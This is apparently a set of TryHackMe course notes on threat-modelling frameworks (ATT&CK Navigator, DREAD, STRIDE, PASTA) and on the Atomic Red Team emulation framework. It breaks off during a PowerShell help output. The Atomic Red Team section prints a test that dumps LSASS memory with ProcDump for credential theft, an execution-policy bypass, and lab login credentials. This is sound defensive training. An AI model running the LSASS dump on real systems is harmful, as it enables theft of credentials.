panel mentioned (from left to right):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/873f7f63e9ccdeca22cba95214f21179.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/873f7f63e9ccdeca22cba95214f21179.png)

- Toggle state - This feature allows you to disable the selected techniques, making their view greyed-out.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/baa4cdd097c0313b28e9f2619afd037c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/baa4cdd097c0313b28e9f2619afd037c.png)

- Background color - This allows you to change the background color of the selected
technique, for highlighting and grouping purposes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e319c6fbf48e55db4295ffe97a2bc99c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e319c6fbf48e55db4295ffe97a2bc99c.png)

- Scoring - Allows you to rate each technique or set of techniques based on
criteria depending on your needs, such as the impact of a technique.
- Comment - Allows you to add notes and observations to a technique.
- Link - Allows you to add external links, such as additional references related to the technique.
- Metadata - Allows you to add custom tags and labels to a particular technique.
- Clear annotations on selected - Remove all annotations on selected techniques.

The image below is an example of using Scoring, Comment, Link and Metadata features.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a87be0e2e7f306a3ac0f52e0eacb9b7c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a87be0e2e7f306a3ac0f52e0eacb9b7c.png)

# Utilising ATT&CK Navigator

To put the concepts of this framework into practice, let's use the following scenario below.

You
 are tasked to utilise the MITRE ATT&CK framework for your threat 
modelling exercise. The organisation you're currently working with is in
 the financial services industry. Given that, some known threat groups 
targeting this industry are:

- APT28 (Fancy Bear)
- APT29 (Cozy Bear)
- Carbanak
- FIN7 (Carbanak/Fancy Bear)
- Lazarus Group

In addition, your organisation uses the following technologies:

- Google Cloud Platform (GCP) for cloud infrastructure
- Online banking platform developed by internal developers
- A Customer Relationship Management (CRM) platform

Lastly, the critical assets that you handle based on your business stakeholders are the following:

- Customer financial data
- Transaction records
- Personally identifiable information (PII)

Given this scenario, you can use the MITRE
 ATT&CK framework and ATT&CK Navigator to map and understand the
 significant techniques attributed to the provided threat groups and 
those affecting GCP and web applications.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c0c43eff99b8a297d50ecc36170e0518.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c0c43eff99b8a297d50ecc36170e0518.png)

*Techniques used by APT28*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb0e387e5b693a3d6eba7b839e5aef2d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb0e387e5b693a3d6eba7b839e5aef2d.png)

*Techniques related to Google Cloud*

Once
 these techniques are identified, you should prioritise the potential 
vulnerabilities that may affect the systems that handle your critical 
assets (financial data, transaction records, and PII). Some of the techniques that you may consider prioritising are the following:

- **Exploit Public-Facing Application (T1190)** - Securing the public-facing application is crucial to prevent unauthorised access attempts.
- **Exploitation for Privilege Escalation (T1068)** - The prevention of escalating attackers' privileges reduces the
chances of obtaining critical data only accessible to administrators.
- **Data from Cloud Storage (T1530)** - Since the cloud instance contains critical data, safeguarding the
confidentiality and integrity of the data stored is crucial.
- **Network Denial of Service (T1498)** - The technique may not directly target the critical data within the
cloud instance. Still, it can lead to service disruptions and potential
impacts on the availability and accessibility of the data.

Now
 that we have identified these, the next step for the threat modelling 
exercise is to remediate and apply appropriate security controls to 
reduce the potential attack surface of our organisation.

**DREAD Framework**

# What is the DREAD Framework?

The DREAD
 framework is a risk assessment model developed by Microsoft to evaluate
 and prioritise security threats and vulnerabilities. It is an acronym 
that stands for:

| **DREAD** | **Definition** |
| --- | --- |
| **Damage** | The
 potential harm that could result from the successful exploitation of a 
vulnerability. This includes data loss, system downtime, or reputational
 damage. |
| **Reproducibility** | The ease with 
which an attacker can successfully recreate the exploitation of a 
vulnerability. A higher reproducibility score suggests that the 
vulnerability is straightforward to abuse, posing a greater risk. |
| **Exploitability** | The
 difficulty level involved in exploiting the vulnerability considering 
factors such as technical skills required, availability of tools or 
exploits, and the amount of time it would take to exploit the 
vulnerability successfully. |
| **Affected Users** | The number or portion of users impacted once the vulnerability has been exploited. |
| **Discoverability** | The
 ease with which an attacker can find and identify the vulnerability 
considering whether it is publicly known or how difficult it is to 
discover based on the exposure of the assets (publicly reachable or in a
 regulated environment). |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8f27a0b481ec730e325da0f04d2b7715.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8f27a0b481ec730e325da0f04d2b7715.png)

The categories are commonly phrased with the following questions to ingest the definitions provided above quickly:

- **Damage** - How bad would an attack be?
- **Reproducibility** - How easy is it to reproduce the attack?
- **Exploitability** - How much work is it to launch the attack?
- **Affected Users** - How many people will be impacted?
- **Discoverability** - How easy is it to discover the vulnerability?

Using the questions above assists in understanding each category and applying it in a risk-assessment context.

# DREAD Framework Guidelines

As
 mentioned above, the DREAD framework is an opinion-based model that 
heavily relies on an analyst's interpretation and assessment. However, 
the reliability of this framework can still be improved by following 
some guidelines:

1. Establish a standardised set of guidelines and definitions for each DREAD category that provides a consistent understanding of how to rate
vulnerabilities. This can be supported by providing examples and
scenarios to illustrate how scores should be assigned under various
circumstances.
2. Encourage collaboration and discussion among
multiple teams. Constructive feedback from different members aids in
justifying the assigned scores, which can lead to a more accurate
assessment.
3. Use the DREAD framework with other risk-assessment
methodologies and regularly review and update the chosen methods and
techniques to ensure they remain relevant and aligned with the
organisation's needs.

By ensuring that these guidelines are 
strictly followed, organisations can reduce the subjective nature of the
 framework and improve the accuracy and reliability of their risk 
assessments.

# Qualitative Analysis Using DREAD Framework

The DREAD
 Framework is typically used for Qualitative Risk Analysis, rating each 
category from one to ten based on a subjective assessment and 
interpretation of the questions above. Moreover, the average score of 
all criteria will calculate the overall DREAD risk rating.

To understand how the scoring works, let's put the concepts into practice by using a good scenario.

A
 software company has developed a new website and needs to assess the 
risk associated with various security threats. Your team has created a 
guideline for scoring each component of the DREAD framework, as shown below:

| DREAD Score | 2.5 | 5 | 7.5 | 10 |
| --- | --- | --- | --- | --- |
| Damage | Minimal infrastructure information disclosure | Minimal information disclosure related to client data | Limited PII leak | Complete data leak |
| Reproducibility | Multiple attack vectors requiring technical expertise | Minor customisation for public exploits needed | Little prerequisite technical skills needed to run the exploit | Users with public exploits can successfully reproduce the exploit |
| Exploitability | Almost no public exploits are available and need customisation of scripts | Complicated exploit scripts available in the wild | Minimal technical skills are required to execute public exploits | Reliable Metasploit module exists |
| Affected Users | Almost none to a small subset | Around 10% of users | More than half of the user base | All users |
| Discoverability | The significant effort needed to discover the vulnerability chains for the exploit to work | Requires a manual way of verifying the vulnerability | Public scanning scripts not embedded in scanning tools exist | Almost all known scanning tools can find the vulnerability |

Given
 this guideline, we can assess some known vulnerabilities in the 
application. Below is an example of scoring provided for each 
vulnerability.

1. Unauthenticated Remote Code Execution (Score: 8)
    - Damage (D): **10**
    - Reproducibility (R): **7.5**
    - Exploitability (E): **10**
    - Affected Users (A): **10**
    - Discoverability (D): **2.5**
2. Insecure Direct Object References (IDOR) in User Profiles (Score: 6.5)
    - Damage (D): **2.5**
    - Reproducibility (R): **7.5**
    - Exploitability (E): **7.5**
    - Affected Users (A): **10**
    - Discoverability (D): **5**
3. Server Misconfiguration Leading to Information Disclosure (Score: 5)
    - Damage (D): **0**
    - Reproducibility (R): **10**
    - Exploitability (E): **10**
    - Affected Users (A): **0**
    - Discoverability (D): **5**

Now what's left is to prioritise the vulnerabilities based on their score and apply mitigations to secure the application.

**STRIDE Framework**

# What is the STRIDE Framework?

The STRIDE
 framework is a threat modelling methodology also developed by 
Microsoft, which helps identify and categorise potential security 
threats in software development and system design. The acronym STRIDE is based on six categories of threats, namely:

| **Category** | **Definition** | **Policy Violated** |
| --- | --- | --- |
| **Spoofing** | Unauthorised access or impersonation of a user or system. | Authentication |
| **Tampering** | Unauthorised modification or manipulation of data or code. | Integrity |
| **Repudiation** | Ability to deny having acted, typically due to insufficient auditing or logging. | Non-repudiation |
| **Information Disclosure** | Unauthorised access to sensitive information, such as personal or financial data. | Confidentiality |
| **Denial of Service** | Disruption of the system's availability, preventing legitimate users from accessing it. | Availability |
| **Elevation of Privilege** | Unauthorised elevation of access privileges, allowing threat actors to perform unintended actions. | Authorisation |

As you can see, the table above also provides what component of the CIA triad is violated. The STRIDE framework is built upon this foundational information security concept.

By
 systematically analysing these six categories of threats, organisations
 can proactively identify and address potential vulnerabilities in their
 systems, applications, or infrastructure, enhancing their overall 
security posture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8b7b10f1edb15a96ecb21c4edd6389b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8b7b10f1edb15a96ecb21c4edd6389b9.png)

To understand the framework better, let's deep-dive into each category and discuss some examples.

- Spoofing
    - Sending an email as another user.
    - Creating a phishing website mimicking a legitimate one to harvest user credentials.
- Tampering
    - Updating the password of another user.
    - Installing system-wide backdoors using an elevated access.
- Repudiation
    - Denying unauthorised money-transfer transactions, wherein the system lacks auditing.
    - Denying sending an offensive message to another person, wherein the person lacks proof of receiving one.
- Information Disclosure
    - Unauthenticated access to a misconfigured database that contains sensitive customer information.
    - Accessing public cloud storage that handles sensitive documents.
- Denial of Service
    - Flooding a web server with many requests, overwhelming its resources, and making it unavailable to legitimate users.
    - Deploying a ransomware that encrypts all system data that prevents other systems
    from accessing the resources the compromised server needs.
- Elevation of Privilege
    - Creating a regular user but being able to access the administrator console.
    - Gaining local administrator privileges on a machine by abusing unpatched systems.

The
 examples above illustrate various scenarios in which the categories can
 occur, emphasising the importance of implementing robust security 
measures to protect against these threats.

A typical representation of results after using the STRIDE framework is via a checklist table, wherein each use case is marked based on what STRIDE component affects it. In addition, some scenarios may cover multiple STRIDE components.

| **Scenario** | **Spoofing** | **Tampering** | **Repudiation** | **Information Disclosure** | **Denial of Service** | **Elevation of Privilege** |
| --- | --- | --- | --- | --- | --- | --- |
| **Sending a spoofed email, wherein the mail gateway lacks email security and logging configuration.** | **✔** |  | **✔** |  |  |  |
| **Flooding a web server with many requests that lack load-balancing capabilities.** |  |  |  |  | **✔** |  |
| **Abusing an SQL injection vulnerability.** |  | **✔** |  | **✔** |  |  |
| **Accessing public cloud storage (such as AWS S3 bucket or Azure blob) that handles customer data**. |  |  |  | **✔** |  |  |
| **Exploiting
 a local privilege escalation vulnerability due to the lack of system 
updates and modifying system configuration for a persistent backdoor.** |  | **✔** |  |  |  | **✔** |

# Threat Modelling With STRIDE

To implement the STRIDE
 framework in threat modelling, it is essential to integrate the six 
threat categories into a systematic process that effectively identifies,
 assesses, and mitigates security risks. Here is a high-level approach 
to incorporating STRIDE in the threat modelling methodologies we discussed.

1. System Decomposition
    
    Break
     down all accounted systems into components, such as applications, 
    networks, and data flows. Understand the architecture, trust boundaries,
     and potential attack surfaces.
    
2. Apply STRIDE Categories
    
    For each component, analyse its exposure to the six STRIDE threat categories. Identify potential threats and vulnerabilities related to each category.
    
3. Threat Assessment
    
    Evaluate the impact and likelihood of each identified threat. Consider the potential consequences and the ease of exploitation and prioritise threats based on their overall risk level.
    
4. Develop Countermeasures
    
    Design
     and implement security controls to address the identified threats 
    tailored to each STRIDE category. For example, to enhance email security
     and mitigate spoofing threats, implement DMARC, DKIM, and SPF, which are email authentication and validation mechanisms that help prevent email spoofing, phishing, and spamming.
    
5. Validation and Verification
    
    Test
     the effectiveness of the implemented countermeasures to ensure they 
    effectively mitigate the identified threats. If possible, conduct 
    penetration testing, code reviews, or security audits.
    
6. Continuous Improvement
    
    Regularly
     review and update the threat model as the system evolves and new 
    threats emerge. Monitor the effective countermeasures and update them as
     needed.
    

By following this approach, you can effectively incorporate the STRIDE framework into your threat modelling process, ensuring a comprehensive analysis of potential security threats.

# Application of STRIDE Framework

To apply the concepts discussed in this task, let's simulate a scenario wherein we can use the STRIDE framework.

Scenario: Your e-commerce company is in the process of designing a 
new payment processing system. To ensure its security and minimise the 
risk of compromise, you are tasked to conduct a threat modelling 
exercise using the STRIDE framework. All your assets are stored in a secure cloud infrastructure developed by your system architects.

As
 the leader of this initiative, you will be working with different teams
 to create a thorough threat modelling plan. Together, you aim to 
identify potential security threats and protect your payment processing 
system, ensuring the safety of your customers' information.

As a guide, here are the roles and responsibilities of the teams joining the initiative:

| **Team** | **Roles and Responsibilities** |
| --- | --- |
| **Development Team** | Responsible for building systems and applications used by the organisation. |
| **System Architecture Team** | Responsible for designing the overall architecture of the cloud services used by the organisation. |
| **Security Team** | Provide expertise on threats, vulnerabilities, and risk mitigation strategies. |
| **Business Stakeholder Team** | Provides
 valuable input on critical assets and business processes, and ensures 
alignment between the initiative and the organisation's strategic goals. |
| **Network Infrastructure Team** | Manages the organisation's network infrastructure, including servers and critical systems. |

**PASTA Framework**

**What is the PASTA Framework?**

PASTA,
 or Process for Attack Simulation and Threat Analysis, is a structured, 
risk-centric threat modelling framework designed to help organisations 
identify and evaluate security threats and vulnerabilities within their 
systems, applications, or infrastructure. PASTA
 provides a systematic, seven-step process that enables security teams 
to understand potential attack scenarios better, assess the likelihood 
and impact of threats, and prioritise remediation efforts accordingly.

This framework was created by Tony UcedaVélez and Marco Morana. They introduced the PASTA framework in their book **"Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis"**, published in 2015.

# Seven-Step Methodology

Similar to the high-level process discussed in the previous task, the PASTA
 framework covers a series of steps, from defining the scope of the 
threat modelling exercise to risk and impact analysis. Below is an 
overview of the seven-step methodology of the PASTA Framework.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae0317162059a8fcf5730e38d3853e01.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae0317162059a8fcf5730e38d3853e01.svg)

1. Define the Objectives
    
    Establish
     the scope of the threat modelling exercise by identifying the systems, 
    applications, or networks being analysed and the specific security 
    objectives and compliance requirements to be met.
    
2. Define the Technical Scope
    
    Create
     an inventory of assets, such as hardware, software, and data, and 
    develop a clear understanding of the system's architecture, 
    dependencies, and data flows.
    
3. Decompose the Application
    
    Break
     down the system into its components, identifying entry points, trust 
    boundaries, and potential attack surfaces. This step also includes 
    mapping out data flows and understanding user roles and privileges 
    within the system.
    
4. Analyse the Threats
    
    Identify
     potential threats to the system by considering various threat sources, 
    such as external attackers, insider threats, and accidental exposures. 
    This step often involves leveraging industry-standard threat 
    classification frameworks or attack libraries.
    
5. Vulnerabilities and Weaknesses Analysis
    
    Analyse
     the system for existing vulnerabilities, such as misconfigurations, 
    software bugs, or unpatched systems, that an attacker could exploit to 
    achieve their objectives. Vulnerability assessment tools and techniques,
     such as static and dynamic code analysis or penetration testing, can be
     employed during this step.
    
6. Analyse the Attacks
    
    Simulate
     potential attack scenarios and evaluate the likelihood and impact of 
    each threat. This step helps determine the risk level associated with 
    each identified threat, allowing security teams to prioritise the most 
    significant risks.
    
7. Risk and Impact Analysis
    
    Develop
     and implement appropriate security controls and countermeasures to 
    address the identified risks, such as updating software, applying 
    patches, or implementing access controls. The chosen countermeasures 
    should be aligned with the organisation's risk tolerance and security 
    objectives.
    

# PASTA Methodology Guidelines

To effectively implement the PASTA framework and optimise its benefits, you may follow these practical guidelines for each step of the methodology.

| **Define the Objectives** | • Set clear and realistic security objectives for the threat modelling exercise.
• Identify relevant compliance requirements and industry-specific security standards. |
| --- | --- |
| **Define the Technical Scope** | • Identify all critical assets, such as systems and applications, that handle sensitive data owned by the organisation.
• Develop a thorough understanding of the system architecture, including data flows and dependencies. |
| **Decompose the Application** | • Break down the system into manageable components or modules.
• Identify and document each component's possible entry points, trust boundaries, attack surfaces, data flows, and user flows. |
| **Analyse the Threats** | • Research and list potential threats from various sources, such as external attackers, insider threats, and accidental exposures.
• Leverage threat intelligence feeds and industry best practices to stay updated on emerging threats. |
| **Vulnerabilities and Weaknesses Analysis** | • Use
 a combination of tools and techniques, such as static and dynamic code 
analysis, vulnerability scanning, and penetration testing, to identify 
potential weaknesses in the system.
• Keep track of known vulnerabilities and ensure they are addressed promptly. |
| **Analyse the Attacks** | • Develop realistic attack scenarios and simulate them to evaluate their potential consequences.
• Create
 a blueprint of scenarios via Attack Trees and ensure that all use cases
 are covered and aligned with the objective of the exercise. |
| **Risk and Impact Analysis** | • Assess the likelihood and impact of each identified threat and prioritise risks based on their overall severity.
• Determine
 the most effective and cost-efficient countermeasures for the 
identified risks, considering the organisation's risk tolerance and 
security objectives. |

These 
guidelines provide a foundation for effectively using the PASTA 
framework's seven-step methodology. However, adapting and customising 
the approach according to your organisation's unique needs and 
requirements is crucial.

# Benefits of Using the PASTA Framework

This
 framework, being risk-centric, offers numerous benefits for 
organisations seeking to enhance their security posture through threat 
modelling.

- The framework is adaptable to unique objectives
and helps organisations align with compliance requirements by
systematically identifying and addressing security risks while ensuring
proper security controls are in place.
- Like the other frameworks, PASTA fosters collaboration between stakeholders, such as developers,
architects, and security professionals, promoting a shared understanding of security risks and facilitating communication across the
organisation.
- In addition, the PASTA methodology helps organisations meet compliance requirements by
systematically identifying and addressing security risks and ensuring
that appropriate security controls are in place.
- Lastly, the primary reason to use PASTA is its comprehensive and systematic process, ensuring a thorough
analysis of the entire risk landscape. Organisations can proactively
address security risks by employing PASTA, tailoring the seven-step methodology to their unique needs, and maintaining a solid security posture.

# Application of PASTA Framework

To apply the concepts discussed in this task, let's simulate a scenario wherein we can use the PASTA framework.

Scenario: Your
 organisation is known for its online banking platform, catering to many
 users across the Asia Pacific region. To ensure its resiliency to 
potential threats, you are tasked to conduct a threat modelling exercise
 using the PASTA framework.

As
 the leader of this initiative, you will be working with different teams
 to create a thorough threat modelling plan. Together, you aim to 
identify potential security threats and protect your online banking 
platform, ensuring the safety of your customers' information.

As a guide, here are the roles and responsibilities of the teams joining the initiative:

| **Team** | **Roles and Responsibilities** |
| --- | --- |
| **Development Team** | Responsible for building systems and applications used by the organisation. |
| **System Architecture Team** | Responsible for designing the overall architecture of the cloud services used by the organisation. |
| **Security Team** | Provide expertise on threats, vulnerabilities, and risk mitigation strategies. |
| **Business Stakeholder Team** | Provides
 valuable input on critical assets and business processes, and ensures 
alignment between the initiative and the organisation's strategic goals. |

You must follow the seven-step PASTA process in choosing whom to approach for the information you need for this threat modelling exercise.

**Conclusion**

Congratulations! You have completed the Threat Modelling room.

To conclude the room, let's summarise the use case applications of each framework:

| Framework | Use Case Applications |
| --- | --- |
| MITRE ATT&CK | Unlike DREAD and STRIDE,
 which focus more on potential risks and vulnerabilities, ATT&CK 
provides a practical and hands-on approach by mapping adversary tactics.
• Assess the effectiveness of existing controls against known attack techniques used by threat actors. |
| DREAD | DREAD offers a more numerical and calculated approach to threat analysis than STRIDE or MITRE ATT&CK, making it excellent for clearly prioritising threats.

• Qualitatively assess the potential risks associated with specific threats.
• Prioritise risk mitigation based on the collective score produced by each DREAD component. |
| STRIDE | While other frameworks like MITRE ATT&CK focus on real-world adversary tactics, STRIDE shines in its structure and methodology, allowing for a systematic review of threats specific to software systems.

• Analyse and categorise threats in software systems.
• Identify potential vulnerabilities in system components based on the six STRIDE threat categories.
• Implement appropriate security controls to mitigate specific threat types. |
| PASTA | Excellent for aligning threat modelling with business objectives. Unlike other frameworks, PASTA integrates business context, making it a more holistic and adaptable choice for organisations.

• Conduct risk-centric threat modelling exercises aligned with business objectives.
• Prioritise threats based on their potential impact and risk level to the organisation.
• Build a flexible methodology that can be adapted to different organisational contexts. |

In general, all these frameworks significantly aid in reducing risks in organisations by:

- Enhancing threat awareness and identifying vulnerabilities
- Prioritising risk mitigation efforts and optimising security controls
- Continuous improvement and adaptation to evolving threats

All
 four frameworks have their unique strengths and applications in threat 
modelling. Leveraging these frameworks in real-world scenarios can 
significantly enhance an organisation's ability to identify and mitigate
 risks, thereby reducing the overall risk landscape and improving 
resilience against potential threats.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d616f4308f0e66ecf9242d070081cac5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/d616f4308f0e66ecf9242d070081cac5.png)

## **ATOMIC RED TEAM**

# What is Atomic Red Team?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fc233ffe1a1a13fadd2695cd04752c7a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fc233ffe1a1a13fadd2695cd04752c7a.png)

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) is an open-source project that provides a framework for performing security testing and threat emulation. It
 consists of tools and techniques that can be used to simulate various 
types of attacks and security threats, such as malware, phishing 
attacks, and network compromise. The Atomic Red Team aims to help 
security professionals assess the effectiveness of their organization's 
security controls and incident response processes and identify areas for
 improvement.

The
 Atomic Red Team framework is designed to be modular and flexible, 
allowing security professionals to select the tactics and techniques 
most relevant to their testing needs. It is intended to be used with 
other tools and frameworks, such as the MITRE ATT&CK framework, which provides a comprehensive overview of common tactics and techniques threat actors use.

All the credit goes to Red Canary for creating this fantastic framework.

**Supported Platforms**

Atomic
 Red Team supports emulation on a wide range of platforms, not only on 
known Operating Systems but also in Cloud Environments. Below is the 
list of platforms supported by the Atomic Red Team.

| Platform Type | Platforms Supported |
| --- | --- |
| Operating System | Windows, Linux, macOS |
| Cloud Infrastructure | AWS, Azure, GCP |
| Cloud Services | Office 365, Google Workspaces, Azure AD |
| Others | Containers (Kubernetes) |

Take note that these platforms pertain to the targets of threat emulation, where attack techniques are executed and observed.

**Understanding How Emulation Works**

In a nutshell, Atomic Red Team emulates commands that mimic threat activity using **Executors**. Below is the list of available executors.

| Executor | Operating System | Notes |
| --- | --- | --- |
| sh or bash - `/bin/sh or /bin/bash` | Linux, macOS | Commands executed by this Executor are usually Unix tools used by threat actors for malicious intent. |
| Command Prompt - `cmd.exe` | Windows | Commands
 executed by this Executor are usually Windows Built-in or Third-party 
binaries used by threat actors for malicious intent. |
| PowerShell - `powershell.exe` | Windows | Emulated commands by this Executor are commonly known malicious PowerShell modules that threat actors abuse. |
| Manual | N/A | The details given in this type are typically written as steps needed to be executed to emulate a threat, such as when GUI steps are involved that cannot be automated. |

**Deep-Dive Into Atomics**

*Before seeing Executors in action, let's deal with the details inside an Atomic.*

Atomics refers to different testing techniques based on the MITRE
 ATT&CK Framework. Each works as a standalone testing mock-up that 
Security Analysts can use to emulate a specific Technique, such as **OS Credential Dumping: LSASS Memory**, for a quick example.

Each Atomic typically contain two files, both of which are named by their MITRE ATT&CK Technique ID:

T1003.001 - OS Credential Dumping: LSASS Memory

```
user@ATOMIC$ ls -lh T1003.001/-rw-r--r--   1 user  user       300B Jan 4 22:57 T1003.001.md
-rw-r--r--   1 user  user       500B Jan 4 22:58 T1003.001.yaml

```

- **Markdown File (.md)** - Contains all the information about the technique, the supported platform, Executor, GUID, and commands to be executed.
- **YAML File (.yaml)** - Configuration used by frameworks, such as Invoke-Atomic and Atomic-Operator, to do the exact emulation of the technique

The Markdown file is written to be self-explanatory, so let's dive deep into the configuration files used to emulate commands.

*There are 12 atomic tests for T1003.001, but we will present only one test below for brevity.*

**Atomic YAML File Breakdown**

The first few fields are already given based on their field names:

- **attack_technique** - MITRE ATT&CK Technique ID, which also signifies the file's name.
- **display_name** - The technique name, similar to how it is presented as a MITRE Technique.
- **atomic_tests** - List of atomic tests, which details how every test is executed.

T1003.001 - OS Credential Dumping: LSASS Memory

```
user@ATOMIC$ cat T1003.001/T1003.001.yamlattack_technique: T1003.001
display_name: "OS Credential Dumping: LSASS Memory"
atomic_tests:
...

```

The following section details the contents of a single Atomic Test under the list of **atomic_tests** field:

- **name** Short snippet that describes how it tests the technique.****
- **auto_generated_guid**  ****Unique identifier of the specific test.
- **description**  ****A ****longer form of the test details and can be written in a multi-line format.
- **supported_platforms** On what platform will the technique be executed (on a Windows machine in this case)
- **input_arguments**  ****Required ****values ****during the execution, resorts to the default value if nothing is supplied.

T1003.001 - OS Credential Dumping: LSASS Memory

```
...
- name: Dump LSASS.exe Memory using ProcDump
  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
  description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump.

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Path where resulting dump should be placed
      type: Path
      default: C:\Windows\Temp\lsass_dump.dmp
    procdump_exe:
      description: Path of Procdump executable
      type: Path
      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe

```

To conclude with the contents of an Atomic test, details about **dependencies** and **executors** are as follows:

- **dependency_executor_name** - Option on how the prerequisites will be validated. The possible values for this field are similar to the **Executor** field.
- **dependencies**
    - **prereq_command**  ****Commands to check if the requirements for running this test are met. The conditions for the "command_prompt"
    Executor are not satisfied if any command returns a non-zero exit code.
    For the "Powershell" Executor, all commands are run as a script block,
    and the script block must return 0 for success.
    - **get_prereq_command** Commands to meet this prerequisite or a message describing how to meet this requirement.
- **executor**
    - **name -** Name **of the** Executor; similar to what has been discussed above.
    - **command** - Exact command to emulate the technique.
    - **cleanup_command**  ****Commands **for** cleaning up the previous atomic test, such as deletion of files or reverting modified configurations.
    - **elevation_required**  ****A ****boolean value that dictates if an admin privilege is required.

T1003.001 - OS Credential Dumping: LSASS Memory

```
...
  dependency_executor_name: powershell
  dependencies:
  - description: |
      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
    prereq_command: |
      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
  executor:
    name: command_prompt
    command: |
      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
    cleanup_command: |
      del "#{output_file}" >nul 2> nul
    elevation_required: true

```

Before concluding this section, it is essential to highlight the **cleanup** feature of Atomics. But why is cleanup significant in threat emulation?

- First and foremost, it helps to ensure that the tested system returns to its original state after completing the emulation.
- Next, writing cleanup scripts help in minimizing the risk of accidental
damage to the system since it serves as an additional verification of
the execution. You understand the impact more as you write the reverse
of the emulation.
- Lastly, it helps to maintain the integrity of the system being tested. Tools left
after emulation exercises could be abused by potential threat actors.

**Invoke-AtomicRedTeam**

We have previously understood Atomic Red Team and how Atomics work; let's extend our knowledge by seeing it in action.

As discussed, the main goal of the Atomic Red Team Framework is to ease the threat emulation process. Hence, tools such as **Invoke-AtomicTest** were
 created to utilise the automation and execution of Atomics. Let's start
 playing with these tools by emulating different attack patterns.

You
 may start the machine attached to this room by clicking the Start 
Machine button. This VM hosts the tools needed throughout the room.

Note: If the VM
 is not visible, use the blue Show Split View button at the top-right of
 the page. In addition, you may use the following credentials for 
alternative access via Remote Desktop (RDP):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cbfa0d0f3a7f16cefa9fddd04b6de8d.png)

| **Username** | administrator |
| --- | --- |
| **Password** | Emulation101! |
| **IP Address** | 10.10.195.89 |

# Invoke-AtomicRedTeam

[Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam/wiki) is a PowerShell
 module created by the same author (Red Canary) that allows Security 
Analysts to run simulations defined by Atomics. To avoid confusion, the 
primary cmdlet used in this module is `Invoke-AtomicTest` and not `Invoke-AtomicRedTeam`.

**Setup**

Open a PowerShell
 window with ExecutionPolicy set to bypass inside the provided Virtual 
Machine. This ignores all security warning prompts while loading the 
module.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator>powershell -ExecutionPolicy bypass

```

Then load the module using the **Import-Module** cmdlet specifying the location of the **Invoke-AtomicRedTeam.psd1** file.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Import-Module "C:\Tools\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

PS C:\Users\Administrator> $PSDefaultParameterValues = @{"Invoke-AtomicTest:PathToAtomicsFolder"="C:\Tools\AtomicRedTeam\atomics"}

```

The additional command executed after the **Import-Module** specifies the location of the Atomics folder in this machine since it is not located in the default location, which is the C:\AtomicRedTeam\atomics directory. You might encounter an error if the latter command is not executed.

You can confirm if the module is successfully loaded once the **help** cmdlet provides information about **Invoke-AtomicTest**.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> help Invoke-AtomicTest

NAME
    Invoke-AtomicTest

SYNTAX
